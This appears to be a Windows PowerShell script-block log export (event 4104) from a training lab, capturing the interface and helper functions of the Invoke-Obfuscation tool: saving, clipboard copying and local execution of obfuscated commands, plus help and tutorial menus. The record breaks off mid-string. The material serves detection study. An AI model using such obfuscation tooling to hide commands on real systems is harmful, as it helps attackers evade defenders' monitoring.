{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":3,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:15:55.300899Z"},"EventRecordID":576821,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-7355-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":9,"MessageTotal":11,"ScriptBlockText":"r\\$($UserInputOutputFilePath.Trim())\"\r\n                    }\r\n                    Else\r\n                    {\r\n                        # User input is a full file path.\r\n                        $OutputFilePath = $UserInputOutputFilePath\r\n                    }\r\n                    \r\n                    # Write ObfuscatedCommand out to disk.\r\n                    Write-Output $Script:ObfuscatedCommand > $OutputFilePath\r\n\r\n                    If($Script:LauncherApplied -AND (Test-Path $OutputFilePath))\r\n                    {\r\n                        $Script:CliSyntax += \"out $OutputFilePath\"\r\n                        Write-Host \"`nSuccessfully output ObfuscatedCommand to\" -NoNewLine -ForegroundColor Cyan\r\n                        Write-Host \" $OutputFilePath\" -NoNewLine -ForegroundColor Yellow\r\n                        Write-Host \".`nA Launcher has been applied so this script cannot be run as a standalone .ps1 file.\" -ForegroundColor Cyan\r\nC:\\Windows\\Notepad.exe $OutputFilePath\r\n                    }\r\n                    ElseIf(!$Script:LauncherApplied -AND (Test-Path $OutputFilePath))\r\n                    {\r\n                        $Script:CliSyntax += \"out $OutputFilePath\"\r\n                        Write-Host \"`nSuccessfully output ObfuscatedCommand to\" -NoNewLine -ForegroundColor Cyan\r\n                        Write-Host \" $OutputFilePath\" -NoNewLine -ForegroundColor Yellow\r\n                        Write-Host \".\" -ForegroundColor Cyan\r\nC:\\Windows\\Notepad.exe $OutputFilePath\r\n                    }\r\n                    Else\r\n                    {\r\n                        Write-Host \"`nERROR: Unable to write ObfuscatedCommand out to\" -NoNewLine -ForegroundColor Red\r\n                        Write-Host \" $OutputFilePath\" -NoNewLine -ForegroundColor Yellow\r\n                    }\r\n                }\r\n                ElseIf($Script:ObfuscatedCommand -eq '')\r\n                {\r\n                    Write-Host \"`n`nERROR:\" -NoNewLine -ForegroundColor Red\r\n                    Write-Host \" There isn't anything to write out to disk.`n       Just enter\" -NoNewLine\r\n                    Write-Host \" SHOW OPTIONS\" -NoNewLine -ForegroundColor Yellow\r\n                    Write-Host \" and look at ObfuscatedCommand.\"\r\n                }\r\n            }\r\n            ElseIf($CopyToClipboardInputOptions[0] -Contains $UserInput)\r\n            {\r\n                If(($Script:ObfuscatedCommand -ne '') -AND ($Script:ObfuscatedCommand -ceq $Script:ScriptBlock))\r\n                {\r\n                    Write-Host \"`n`nWARNING:\" -NoNewLine -ForegroundColor Red\r\n                    Write-Host \" You haven't applied any obfuscation.`n         Just enter\" -NoNewLine\r\n                    Write-Host \" SHOW OPTIONS\" -NoNewLine -ForegroundColor Yellow\r\n                    Write-Host \" and look at ObfuscatedCommand.\"\r\n                }\r\n                ElseIf($Script:ObfuscatedCommand -ne '')\r\n                {\r\n                    # Copy ObfuscatedCommand to clipboard.\r\n                    # Try-Catch block introduced since PowerShell v2.0 without -STA defined will not be able to perform clipboard functionality.\r\n                    Try\r\n                    {\r\n                        $Null = [Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\")\r\n                        [Windows.Forms.Clipboard]::SetText($Script:ObfuscatedCommand)\r\n\r\n                        If($Script:LauncherApplied)\r\n                        {\r\n                            Write-Host \"`n`nSuccessfully copied ObfuscatedCommand to clipboard.\" -ForegroundColor Cyan\r\n                        }\r\n                        Else\r\n                        {\r\n                            Write-Host \"`n`nSuccessfully copied ObfuscatedCommand to clipboard.`nNo Launcher has been applied, so command can only be pasted into powershell.exe.\" -ForegroundColor Cyan\r\n                        }\r\n                    }\r\n                    Catch\r\n                    {\r\n                        $ErrorMessage = \"Clipboard functionality will not work in PowerShell version $($PsVersionTable.PsVersion.Major) unless you add -STA (Single-Threaded Apartment) execution flag to powershell.exe.\"\r\n\r\n                        If((Get-Command Write-Host).CommandType -ne 'Cmdlet')\r\n                        {\r\n                            # Retrieving Write-Host and Start-Sleep Cmdlets to get around the current proxy functions of Write-Host and Start-Sleep that are overloaded if -Quiet flag was used.\r\n                            . ((Get-Command Write-Host)  | Where-Object {$_.CommandType -eq 'Cmdlet'}) \"`n`nWARNING: \" -NoNewLine -ForegroundColor Red\r\n                            . ((Get-Command Write-Host)  | Where-Object {$_.CommandType -eq 'Cmdlet'}) $ErrorMessage -NoNewLine\r\n\r\n                            . ((Get-Command Start-Sleep) | Where-Object {$_.CommandType -eq 'Cmdlet'}) 2\r\n                        }\r\n                        Else\r\n                        {\r\n                            Write-Host \"`n`nWARNING: \" -NoNewLine -ForegroundColor Red\r\n                            Write-Host $ErrorMessage\r\n\r\n                            If($Script:CliSyntax -gt 0) {Start-Sleep 2}\r\n                        }\r\n                    }\r\n                    \r\n                    $Script:CliSyntax += 'clip'\r\n                }\r\n                ElseIf($Script:ObfuscatedCommand -eq '')\r\n                {\r\n                    Write-Host \"`n`nERROR:\" -NoNewLine -ForegroundColor Red\r\n                    Write-Host \" There isn't anything to copy to your clipboard.`n       Just enter\" -NoNewLine\r\n                    Write-Host \" SHOW OPTIONS\" -NoNewLine -ForegroundColor Yellow\r\n                    Write-Host \" and look at ObfuscatedCommand.\" -NoNewLine\r\n                }\r\n                \r\n            }\r\n            ElseIf($ExecutionInputOptions[0] -Contains $UserInput)\r\n            {\r\n                If($Script:LauncherApplied)\r\n                {\r\n                    Write-Host \"`n`nERROR:\" -NoNewLine -ForegroundColor Red\r\n                    Write-Host \" Cannot execute because you have applied a Launcher.`n       Enter\" -NoNewLine\r\n                    Write-Host \" COPY\" -NoNewLine -ForeGroundColor Yellow\r\n                    Write-Host \"/\" -NoNewLine\r\n                    Write-Host \"CLIP\" -NoNewLine -ForeGroundColor Yellow\r\n                    Write-Host \" and paste into cmd.exe.`n       Or enter\" -NoNewLine\r\n                    Write-Host \" UNDO\" -NoNewLine -ForeGroundColor Yellow\r\n                    Write-Host \" to remove the Launcher from ObfuscatedCommand.\"\r\n                }\r\n                ElseIf($Script:ObfuscatedCommand -ne '')\r\n                {\r\n                    If($Script:ObfuscatedCommand -ceq $Script:ScriptBlock) {Write-Host \"`n`nInvoking (though you haven't obfuscated anything yet):\"}\r\n                    Else {Write-Host \"`n`nInvoking:\"}\r\n                    \r\n                    Out-ScriptContents $Script:ObfuscatedCommand\r\n                    Write-Host ''\r\n                    $null = Invoke-Expression $Script:ObfuscatedCommand\r\n                }\r\n                Else {\r\n                    Write-Host \"`n`nERROR:\" -NoNewLine -ForegroundColor Red\r\n                    Write-Host \" Cannot execute because you have not set ScriptPath or ScriptBlock.`n       Enter\" -NoNewline\r\n                    Write-Host \" SHOW OPTIONS\" -NoNewLine -ForegroundColor Yellow\r\n                    Write-Host \" to set ScriptPath or ScriptBlock.\"\r\n                }\r\n            }\r\n            Else\r\n            {\r\n                Write-Host \"`n`nERROR:\" -NoNewLine -ForegroundColor Red\r\n                Write-Host \" You entered an invalid option. Enter\" -NoNewLine\r\n                Write-Host \" HELP\" -NoNewLine -ForegroundColor Yellow\r\n                Write-Host \" for more information.\"\r\n\r\n                # If the failed input was part of $Script:CompoundCommand then cancel out the rest of the compound command so it is not further processed.\r\n                If($Script:CompoundCommand.Count -gt 0)\r\n                {\r\n                    $Script:CompoundCommand = @()\r\n                }\r\n\r\n                # Output all available/acceptable options for current menu if invalid input was entered.\r\n                If($AcceptableInput.Count -gt 1)\r\n                {\r\n                    $Message = 'Valid options for current menu include:'\r\n                }\r\n                Else\r\n                {\r\n                    $Message = 'Valid option for current menu includes:'\r\n                }\r\n                Write-Host \"       $Message \" -NoNewLine\r\n\r\n                $Counter=0\r\n                ForEach($AcceptableOption in $AcceptableInput)\r\n                {\r\n                    $Counter++\r\n\r\n                    # Change color and verbiage if acceptable options will execute an obfuscation function.\r\n                    If($SelectionContainsCommand)\r\n                    {\r\n                        $ColorToOutput = 'Green'\r\n                    }\r\n                    Else\r\n                    {\r\n                        $ColorToOutput = 'Yellow'\r\n                    }\r\n\r\n                    Write-Host $AcceptableOption -NoNewLine -ForegroundColor $ColorToOutput\r\n                    If(($Counter -lt $AcceptableInput.Length) -AND ($AcceptableOption.Length -gt 0))\r\n                    {\r\n                        Write-Host ', ' -NoNewLine\r\n                    }\r\n                }\r\n                Write-Host ''\r\n            }\r\n        }\r\n    }\r\n    \r\n    Return $UserInput.ToLower()\r\n}\r\n\r\n\r\nFunction Show-OptionsMenu\r\n{\r\n<#\r\n.SYNOPSIS\r\n\r\nHELPER FUNCTION :: Displays options menu for Invoke-Obfuscation.\r\n\r\nInvoke-Obfuscation Function: Show-OptionsMenu\r\nAuthor: Daniel Bohannon (@danielhbohannon)\r\nLicense: Apache License, Version 2.0\r\nRequired Dependencies: None\r\nOptional Dependencies: None\r\n \r\n.DESCRIPTION\r\n\r\nShow-OptionsMenu displays options menu for Invoke-Obfuscation.\r\n\r\n.EXAMPLE\r\n\r\nC:\\PS> Show-OptionsMenu\r\n\r\n.NOTES\r\n\r\nThis is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.\r\n\r\n.LINK\r\n\r\nhttp://www.danielbohannon.com\r\n#>\r\n\r\n    # Set potentially-updated script-level values in $Script:OptionsMenu before displaying.\r\n    $Counter = 0\r\n    ForEach($Line in $Script:OptionsMenu)\r\n    {\r\n        If($Line[0].ToLower().Trim() -eq 'scriptpath')            {$Script:OptionsMenu[$Counter][1] = $Script:ScriptPath}\r\n        If($Line[0].ToLower().Trim() -eq 'scriptblock')           {$Script:OptionsMenu[$Counter][1] = $Script:ScriptBlock}\r\n        If($Line[0].ToLower().Trim() -eq 'commandlinesyntax')     {$Script:OptionsMenu[$Counter][1] = $Script:CliSyntax}\r\n        If($Line[0].ToLower().Trim() -eq 'executioncommands')     {$Script:OptionsMenu[$Counter][1] = $Script:ExecutionCommands}\r\n        If($Line[0].ToLower().Trim() -eq 'obfuscatedcommand')\r\n        {\r\n            # Only add obfuscatedcommand if it is different than scriptblock (to avoid showing obfuscatedcommand before it has been obfuscated).\r\n            If($Script:ObfuscatedCommand -cne $Script:ScriptBlock) {$Script:OptionsMenu[$Counter][1] = $Script:ObfuscatedCommand}\r\n            Else {$Script:OptionsMenu[$Counter][1] = ''}\r\n        }\r\n        If($Line[0].ToLower().Trim() -eq 'obfuscationlength')\r\n        {\r\n            # Only set/display ObfuscationLength if there is an obfuscated command.\r\n            If(($Script:ObfuscatedCommand.Length -gt 0) -AND ($Script:ObfuscatedCommand -cne $Script:ScriptBlock)) {$Script:OptionsMenu[$Counter][1] = $Script:ObfuscatedCommand.Length}\r\n            Else {$Script:OptionsMenu[$Counter][1] = ''}\r\n        }\r\n\r\n        $Counter++\r\n","ScriptBlockId":"a8537f4c-03a8-41a9-a1fd-a3b8bcedaf29","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Invoke-Obfuscation.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":3,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:15:55.300927Z"},"EventRecordID":576822,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-7355-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":10,"MessageTotal":11,"ScriptBlockText":"    }\r\n    \r\n    # Output menu.\r\n    Write-Host \"`n`nSHOW OPTIONS\" -NoNewLine -ForegroundColor Cyan\r\n    Write-Host \" ::\" -NoNewLine\r\n    Write-Host \" Yellow\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" options can be set by entering\" -NoNewLine\r\n    Write-Host \" SET OPTIONNAME VALUE\" -NoNewLine -ForegroundColor Green\r\n    Write-Host \".`n\"\r\n    ForEach($Option in $Script:OptionsMenu)\r\n    {\r\n        $OptionTitle = $Option[0]\r\n        $OptionValue = $Option[1]\r\n        $CanSetValue = $Option[2]\r\n      \r\n        Write-Host $LineSpacing -NoNewLine\r\n        \r\n        # For options that can be set by user, output as Yellow.\r\n        If($CanSetValue) {Write-Host $OptionTitle -NoNewLine -ForegroundColor Yellow}\r\n        Else {Write-Host $OptionTitle -NoNewLine}\r\n        Write-Host \": \" -NoNewLine\r\n        \r\n        # Handle coloring and multi-value output for ExecutionCommands and ObfuscationLength.\r\n        If($OptionTitle -eq 'ObfuscationLength')\r\n        {\r\n            Write-Host $OptionValue -ForegroundColor Cyan\r\n        }\r\n        ElseIf($OptionTitle -eq 'ScriptBlock')\r\n        {\r\n            Out-ScriptContents $OptionValue\r\n        }\r\n        ElseIf($OptionTitle -eq 'CommandLineSyntax')\r\n        {\r\n            # CLISyntax output.\r\n            $SetSyntax = ''\r\n            If(($Script:ScriptPath.Length -gt 0) -AND ($Script:ScriptPath -ne 'N/A'))\r\n            {\r\n                $SetSyntax = \" -ScriptPath '$Script:ScriptPath'\"\r\n            }\r\n            ElseIf(($Script:ScriptBlock.Length -gt 0) -AND ($Script:ScriptPath -eq 'N/A'))\r\n            {\r\n                $SetSyntax = \" -ScriptBlock {$Script:ScriptBlock}\"\r\n            }\r\n\r\n            $CommandSyntax = ''\r\n            If($OptionValue.Count -gt 0)\r\n            {\r\n                $CommandSyntax = \" -Command '\" + ($OptionValue -Join ',') + \"' -Quiet\"\r\n            }\r\n\r\n            If(($SetSyntax -ne '') -OR ($CommandSyntax -ne ''))\r\n            {\r\n                $CliSyntaxToOutput = \"Invoke-Obfuscation\" + $SetSyntax + $CommandSyntax\r\n                Write-Host $CliSyntaxToOutput -ForegroundColor Cyan\r\n            }\r\n            Else\r\n            {\r\n                Write-Host ''\r\n            }\r\n        }\r\n        ElseIf($OptionTitle -eq 'ExecutionCommands')\r\n        {\r\n            # ExecutionCommands output.\r\n            If($OptionValue.Count -gt 0) {Write-Host ''}\r\n            $Counter = 0\r\n            ForEach($ExecutionCommand in $OptionValue)\r\n            {\r\n                $Counter++\r\n                If($ExecutionCommand.Length -eq 0) {Write-Host ''; Continue}\r\n            \r\n                $ExecutionCommand = $ExecutionCommand.Replace('$ScriptBlock','~').Split('~')\r\n                Write-Host \"    $($ExecutionCommand[0])\" -NoNewLine -ForegroundColor Cyan\r\n                Write-Host '$ScriptBlock' -NoNewLine -ForegroundColor Magenta\r\n                \r\n                # Handle output formatting when SHOW OPTIONS is run.\r\n                If(($OptionValue.Count -gt 0) -AND ($Counter -lt $OptionValue.Count))\r\n                {\r\n                    Write-Host $ExecutionCommand[1] -ForegroundColor Cyan\r\n                }\r\n                Else\r\n                {\r\n                    Write-Host $ExecutionCommand[1] -NoNewLine -ForegroundColor Cyan\r\n                }\r\n\r\n            }\r\n            Write-Host ''\r\n        }\r\n        ElseIf($OptionTitle -eq 'ObfuscatedCommand')\r\n        {\r\n            Out-ScriptContents $OptionValue\r\n        }\r\n        Else\r\n        {\r\n            Write-Host $OptionValue -ForegroundColor Magenta\r\n        }\r\n    }\r\n    \r\n}\r\n\r\n\r\nFunction Show-HelpMenu\r\n{\r\n<#\r\n.SYNOPSIS\r\n\r\nHELPER FUNCTION :: Displays help menu for Invoke-Obfuscation.\r\n\r\nInvoke-Obfuscation Function: Show-HelpMenu\r\nAuthor: Daniel Bohannon (@danielhbohannon)\r\nLicense: Apache License, Version 2.0\r\nRequired Dependencies: None\r\nOptional Dependencies: None\r\n \r\n.DESCRIPTION\r\n\r\nShow-HelpMenu displays help menu for Invoke-Obfuscation.\r\n\r\n.EXAMPLE\r\n\r\nC:\\PS> Show-HelpMenu\r\n\r\n.NOTES\r\n\r\nThis is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.\r\n\r\n.LINK\r\n\r\nhttp://www.danielbohannon.com\r\n#>\r\n\r\n    # Show Help Menu.\r\n    Write-Host \"`n`nHELP MENU\" -NoNewLine -ForegroundColor Cyan\r\n    Write-Host \" :: Available\" -NoNewLine\r\n    Write-Host \" options\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" shown below:`n\"\r\n    ForEach($InputOptionsList in $AllAvailableInputOptionsLists)\r\n    {\r\n        $InputOptionsCommands    = $InputOptionsList[0]\r\n        $InputOptionsDescription = $InputOptionsList[1]\r\n\r\n        # Add additional coloring to string encapsulated by <> if it exists in $InputOptionsDescription.\r\n        If($InputOptionsDescription.Contains('<') -AND $InputOptionsDescription.Contains('>'))\r\n        {\r\n            $FirstPart  = $InputOptionsDescription.SubString(0,$InputOptionsDescription.IndexOf('<'))\r\n            $MiddlePart = $InputOptionsDescription.SubString($FirstPart.Length+1)\r\n            $MiddlePart = $MiddlePart.SubString(0,$MiddlePart.IndexOf('>'))\r\n            $LastPart   = $InputOptionsDescription.SubString($FirstPart.Length+$MiddlePart.Length+2)\r\n            Write-Host \"$LineSpacing $FirstPart\" -NoNewLine\r\n            Write-Host $MiddlePart -NoNewLine -ForegroundColor Cyan\r\n            Write-Host $LastPart -NoNewLine\r\n        }\r\n        Else\r\n        {\r\n            Write-Host \"$LineSpacing $InputOptionsDescription\" -NoNewLine\r\n        }\r\n        \r\n        $Counter = 0\r\n        ForEach($Command in $InputOptionsCommands)\r\n        {\r\n            $Counter++\r\n            Write-Host $Command.ToUpper() -NoNewLine -ForegroundColor Yellow\r\n            If($Counter -lt $InputOptionsCommands.Count) {Write-Host ',' -NoNewLine}\r\n        }\r\n        Write-Host ''\r\n    }\r\n}\r\n\r\n\r\nFunction Show-Tutorial\r\n{\r\n<#\r\n.SYNOPSIS\r\n\r\nHELPER FUNCTION :: Displays tutorial information for Invoke-Obfuscation.\r\n\r\nInvoke-Obfuscation Function: Show-Tutorial\r\nAuthor: Daniel Bohannon (@danielhbohannon)\r\nLicense: Apache License, Version 2.0\r\nRequired Dependencies: None\r\nOptional Dependencies: None\r\n \r\n.DESCRIPTION\r\n\r\nShow-Tutorial displays tutorial information for Invoke-Obfuscation.\r\n\r\n.EXAMPLE\r\n\r\nC:\\PS> Show-Tutorial\r\n\r\n.NOTES\r\n\r\nThis is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.\r\n\r\n.LINK\r\n\r\nhttp://www.danielbohannon.com\r\n#>\r\n\r\n    Write-Host \"`n`nTUTORIAL\" -NoNewLine -ForegroundColor Cyan\r\n    Write-Host \" :: Here is a quick tutorial showing you how to get your obfuscation on:\"\r\n    \r\n    Write-Host \"`n1) \" -NoNewLine -ForegroundColor Cyan\r\n    Write-Host \"Load a scriptblock (SET SCRIPTBLOCK) or a script path/URL (SET SCRIPTPATH).\"\r\n    Write-Host \"   SET SCRIPTBLOCK Write-Host 'This is my test command' -ForegroundColor Green\" -ForegroundColor Green\r\n    \r\n    Write-Host \"`n2) \" -NoNewLine -ForegroundColor Cyan\r\n    Write-Host \"Navigate through the obfuscation menus where the options are in\" -NoNewLine\r\n    Write-Host \" YELLOW\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \".\"\r\n    Write-Host \"   GREEN\" -NoNewLine -ForegroundColor Green\r\n    Write-Host \" options apply obfuscation.\"\r\n    Write-Host \"   Enter\" -NoNewLine\r\n    Write-Host \" BACK\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \"/\" -NoNewLine\r\n    Write-Host \"CD ..\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" to go to previous menu and\" -NoNewLine\r\n    Write-Host \" HOME\" -NoNewline -ForegroundColor Yellow\r\n    Write-Host \"/\" -NoNewline\r\n    Write-Host \"MAIN\" -NoNewline -ForegroundColor Yellow\r\n    Write-Host \" to go to home menu.`n   E.g. Enter\" -NoNewLine\r\n    Write-Host \" ENCODING\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" & then\" -NoNewLine\r\n    Write-Host \" 5\" -NoNewLine -ForegroundColor Green\r\n    Write-Host \" to apply SecureString obfuscation.\"\r\n    \r\n    Write-Host \"`n3) \" -NoNewLine -ForegroundColor Cyan\r\n    Write-Host \"Enter\" -NoNewLine\r\n    Write-Host \" TEST\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \"/\" -NoNewLine\r\n    Write-Host \"EXEC\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" to test the obfuscated command locally.`n   Enter\" -NoNewLine\r\n    Write-Host \" SHOW\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" to see the currently obfuscated command.\"\r\n    \r\n    Write-Host \"`n4) \" -NoNewLine -ForegroundColor Cyan\r\n    Write-Host \"Enter\" -NoNewLine\r\n    Write-Host \" COPY\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \"/\" -NoNewLine\r\n    Write-Host \"CLIP\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" to copy obfuscated command out to your clipboard.\"\r\n    Write-Host \"   Enter\" -NoNewLine\r\n    Write-Host \" OUT\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" to write obfuscated command out to disk.\"\r\n    \r\n    Write-Host \"`n5) \" -NoNewLine -ForegroundColor Cyan\r\n    Write-Host \"Enter\" -NoNewLine\r\n    Write-Host \" RESET\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" to remove all obfuscation and start over.`n   Enter\" -NoNewLine\r\n    Write-Host \" UNDO\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" to undo last obfuscation.`n   Enter\" -NoNewLine\r\n    Write-Host \" HELP\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \"/\" -NoNewLine\r\n    Write-Host \"?\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" for help menu.\"\r\n    \r\n    Write-Host \"`nAnd finally the obligatory `\"Don't use this for evil, please`\"\" -NoNewLine -ForegroundColor Cyan\r\n    Write-Host \" :)\" -ForegroundColor Green\r\n}\r\n\r\n\r\nFunction Out-ScriptContents\r\n{\r\n<#\r\n.SYNOPSIS\r\n\r\nHELPER FUNCTION :: Displays current obfuscated command for Invoke-Obfuscation.\r\n\r\nInvoke-Obfuscation Function: Out-ScriptContents\r\nAuthor: Daniel Bohannon (@danielhbohannon)\r\nLicense: Apache License, Version 2.0\r\nRequired Dependencies: None\r\nOptional Dependencies: None\r\n \r\n.DESCRIPTION\r\n\r\nOut-ScriptContents displays current obfuscated command for Invoke-Obfuscation.\r\n\r\n.PARAMETER ScriptContents\r\n\r\nSpecifies the string containing your payload.\r\n\r\n.PARAMETER PrintWarning\r\n\r\nSwitch to output redacted form of ScriptContents if they exceed 8,190 characters.\r\n\r\n.EXAMPLE\r\n\r\nC:\\PS> Out-ScriptContents\r\n\r\n.NOTES\r\n\r\nThis is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.\r\n\r\n.LINK\r\n\r\nhttp://www.danielbohannon.com\r\n#>\r\n\r\n    Param(\r\n        [Parameter(ValueFromPipeline = $true)]\r\n        [String]\r\n        $ScriptContents,\r\n\r\n        [Switch]\r\n        $PrintWarning\r\n    )\r\n\r\n    If($ScriptContents.Length -gt $CmdMaxLength)\r\n    {\r\n        # Output ScriptContents, handling if the size of ScriptContents exceeds $CmdMaxLength characters.\r\n        $RedactedPrintLength = $CmdMaxLength/5\r\n        \r\n        # Handle printing redaction message in middle of screen. #OCD\r\n        $CmdLineWidth = (Get-Host).UI.RawUI.BufferSize.Width\r\n        $RedactionMessage = \"<REDACTED: ObfuscatedLength = $($ScriptContents.Length)>\"\r\n        $CenteredRedactionMessageStartIndex = (($CmdLineWidth-$RedactionMessage.Length)/2) - \"[*] ObfuscatedCommand: \".Length\r\n        $CurrentRedactionMessageStartIndex = ($RedactedPrintLength % $CmdLineWidth)\r\n        \r\n        If($CurrentRedactionMessageStartIndex -gt $CenteredRedactionMessageStartIndex)\r\n        {\r\n            $RedactedPrintLength = $RedactedPrintLength-($CurrentRedactionMessageStartIndex-$CenteredRedactionMessageStartIndex)\r\n        }\r\n        Else\r\n        {\r\n            $RedactedPrintLength = $RedactedPrintLength+($CenteredRedactionMessageStartIndex-$CurrentRedactionMessageStartIndex)\r\n        }\r\n    \r\n        Write-Host $ScriptContents.SubString(0,$RedactedPrintLength) -NoNewLine -ForegroundColor Magenta\r\n        Write-","ScriptBlockId":"a8537f4c-03a8-41a9-a1fd-a3b8bcedaf29","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Invoke-Obfuscation.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":3,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:15:55.300938Z"},"EventRecordID":576823,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-7355-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":11,"MessageTotal":11,"ScriptBlockText":"Host $RedactionMessage -NoNewLine -ForegroundColor Yellow\r\n        Write-Host $ScriptContents.SubString($ScriptContents.Length-$RedactedPrintLength) -ForegroundColor Magenta\r\n    }\r\n    Else\r\n    {\r\n        Write-Host $ScriptContents -ForegroundColor Magenta\r\n    }\r\n\r\n    # Make sure final command doesn't exceed cmd.exe's character limit.\r\n    If($ScriptContents.Length -gt $CmdMaxLength)\r\n    {\r\n        If($PSBoundParameters['PrintWarning'])\r\n        {\r\n            Write-Host \"`nWARNING: This command exceeds the cmd.exe maximum length of $CmdMaxLength.\" -ForegroundColor Red\r\n            Write-Host \"         Its length is\" -NoNewLine -ForegroundColor Red\r\n            Write-Host \" $($ScriptContents.Length)\" -NoNewLine -ForegroundColor Yellow\r\n            Write-Host \" characters.\" -ForegroundColor Red\r\n        }\r\n    }\r\n}          \r\n\r\n\r\nFunction Show-AsciiArt\r\n{\r\n<#\r\n.SYNOPSIS\r\n\r\nHELPER FUNCTION :: Displays random ASCII art for Invoke-Obfuscation.\r\n\r\nInvoke-Obfuscation Function: Show-AsciiArt\r\nAuthor: Daniel Bohannon (@danielhbohannon)\r\nLicense: Apache License, Version 2.0\r\nRequired Dependencies: None\r\nOptional Dependencies: None\r\n \r\n.DESCRIPTION\r\n\r\nShow-AsciiArt displays random ASCII art for Invoke-Obfuscation, and also displays ASCII art during script startup.\r\n\r\n.EXAMPLE\r\n\r\nC:\\PS> Show-AsciiArt\r\n\r\n.NOTES\r\n\r\nCredit for ASCII art font generation: http://patorjk.com/software/taag/\r\nThis is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.\r\n\r\n.LINK\r\n\r\nhttp://www.danielbohannon.com\r\n#>\r\n    [CmdletBinding()] Param (\r\n        [Parameter(Position = 0)]\r\n        [ValidateNotNullOrEmpty()]\r\n        [Switch]\r\n        $Random\r\n    )\r\n\r\n    # Create multiple ASCII art title banners.\r\n    $Spacing = \"`t\"\r\n    $InvokeObfuscationAscii  = @()\r\n    $InvokeObfuscationAscii += $Spacing + '    ____                 __                              '\r\n    $InvokeObfuscationAscii += $Spacing + '   /  _/___ _   ______  / /_____                         '\r\n    $InvokeObfuscationAscii += $Spacing + '   / // __ \\ | / / __ \\/ //_/ _ \\______                  '\r\n    $InvokeObfuscationAscii += $Spacing + ' _/ // / / / |/ / /_/ / ,< /  __/_____/                  '\r\n    $InvokeObfuscationAscii += $Spacing + '/______ /__|_________/_/|_|\\___/         __  _           '\r\n    $InvokeObfuscationAscii += $Spacing + '  / __ \\/ /_  / __/_  ________________ _/ /_(_)___  ____ '\r\n    $InvokeObfuscationAscii += $Spacing + ' / / / / __ \\/ /_/ / / / ___/ ___/ __ `/ __/ / __ \\/ __ \\'\r\n    $InvokeObfuscationAscii += $Spacing + '/ /_/ / /_/ / __/ /_/ (__  ) /__/ /_/ / /_/ / /_/ / / / /'\r\n    $InvokeObfuscationAscii += $Spacing + '\\____/_.___/_/  \\__,_/____/\\___/\\__,_/\\__/_/\\____/_/ /_/ '\r\n    \r\n    # Ascii art to run only during script startup.\r\n    If(!$PSBoundParameters['Random'])\r\n    {\r\n        $ArrowAscii  = @()\r\n        $ArrowAscii += '  |  '\r\n        $ArrowAscii += '  |  '\r\n        $ArrowAscii += ' \\ / '\r\n        $ArrowAscii += '  V  '\r\n\r\n        # Show actual obfuscation example (generated with this tool) in reverse.\r\n        Write-Host \"`nIEX( ( 